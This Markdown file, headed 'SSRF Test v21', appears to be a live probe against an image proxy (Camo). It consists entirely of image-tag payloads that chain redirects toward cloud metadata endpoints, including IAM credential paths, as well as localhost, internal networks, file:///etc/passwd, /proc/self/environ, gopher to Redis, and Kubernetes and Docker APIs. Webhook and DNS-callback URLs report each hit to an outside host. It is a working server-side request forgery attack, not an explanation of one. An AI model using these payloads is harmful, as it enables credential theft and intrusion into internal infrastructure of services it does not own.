# SSRF Test v21 - Redirect Chain SSRF Deep Dive

Testing if Camo's redirect following bypasses internal IP checks.

## Canary
![](https://webhook.site/0e5ce386-8634-418a-8abd-f9cd8768638f/v21-canary.gif)

## 1. httpbin.org Redirect to Internal IPs

### AWS Metadata via redirect
![meta1](http://httpbin.org/redirect-to?url=http://169.254.169.254/latest/meta-data/)
![meta2](http://httpbin.org/redirect-to?url=http://169.254.169.254/latest/user-data)
![meta3](http://httpbin.org/redirect-to?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/)

### Localhost via redirect
![local1](http://httpbin.org/redirect-to?url=http://127.0.0.1/)
![local2](http://httpbin.org/redirect-to?url=http://localhost/)
![local3](http://httpbin.org/redirect-to?url=http://0.0.0.0/)

### Internal networks via redirect
![int1](http://httpbin.org/redirect-to?url=http://10.0.0.1/)
![int2](http://httpbin.org/redirect-to?url=http://192.168.1.1/)
![int3](http://httpbin.org/redirect-to?url=http://172.16.0.1/)

## 2. Multiple Redirect Hops

### Triple redirect
![hop1](http://httpbin.org/redirect/3?url=http://169.254.169.254/latest/meta-data/)

### Absolute redirect
![abs1](http://httpbin.org/absolute-redirect/1?url=http://169.254.169.254/)

### Relative redirect  
![rel1](http://httpbin.org/relative-redirect/1?url=http://127.0.0.1/)

## 3. DNS Exfiltration After Redirect

### If redirect works, trigger DNS callback
![dns1](http://httpbin.org/redirect-to?url=http://redirect-success.0e5ce386-8634-418a-8abd-f9cd8768638f.dnshook.site/test.gif)
![dns2](http://httpbin.org/redirect-to?url=http://0e5ce386-8634-418a-8abd-f9cd8768638f.dnshook.site/after-redir.gif)

## 4. Protocol Downgrade via Redirect

### HTTPS to HTTP redirect
![proto1](https://httpbin.org/redirect-to?url=http://webhook.site/0e5ce386-8634-418a-8abd-f9cd8768638f/https-to-http.gif)
![proto2](https://httpbin.org/redirect-to?url=http://169.254.169.254/latest/meta-data/)

## 5. Alternative Redirect Services

### request.basno.com (another redirect service)
![basno1](http://request.basno.com/anything/redirect?url=http://webhook.site/0e5ce386-8634-418a-8abd-f9cd8768638f/basno.gif)

### mockbin.io
![mock1](http://mockbin.io/redirect/302?to=http://webhook.site/0e5ce386-8634-418a-8abd-f9cd8768638f/mockbin.gif)

## 6. File Protocol via Redirect

![file1](http://httpbin.org/redirect-to?url=file:///etc/passwd)
![file2](http://httpbin.org/redirect-to?url=file:///proc/self/environ)

## 7. Gopher Protocol via Redirect

![gopher1](http://httpbin.org/redirect-to?url=gopher://localhost:25/)
![gopher2](http://httpbin.org/redirect-to?url=gopher://localhost:6379/_INFO)

## 8. Cloud Metadata via Redirect

### GCP
![gcp1](http://httpbin.org/redirect-to?url=http://metadata.google.internal/computeMetadata/v1/)
![gcp2](http://httpbin.org/redirect-to?url=http://169.254.169.254/computeMetadata/v1/)

### Azure
![az1](http://httpbin.org/redirect-to?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01)
![az2](http://httpbin.org/redirect-to?url=http://168.63.129.16/machine)

### DigitalOcean
![do1](http://httpbin.org/redirect-to?url=http://169.254.169.254/metadata/v1.json)

## 9. Kubernetes via Redirect

![k8s1](http://httpbin.org/redirect-to?url=http://kubernetes.default.svc/)
![k8s2](http://httpbin.org/redirect-to?url=http://10.0.0.1:443/api/v1/)

## 10. Docker via Redirect

![dock1](http://httpbin.org/redirect-to?url=http://172.17.0.1:2375/version)
![dock2](http://httpbin.org/redirect-to?url=http://host.docker.internal/)

## 11. Verification - Confirm Redirect Works

![verify1](http://httpbin.org/redirect-to?url=http://webhook.site/0e5ce386-8634-418a-8abd-f9cd8768638f/redirect-verify.gif)
![verify2](https://webhook.site/0e5ce386-8634-418a-8abd-f9cd8768638f/direct-verify.gif)

Version 21 - Redirect Chain SSRF Attack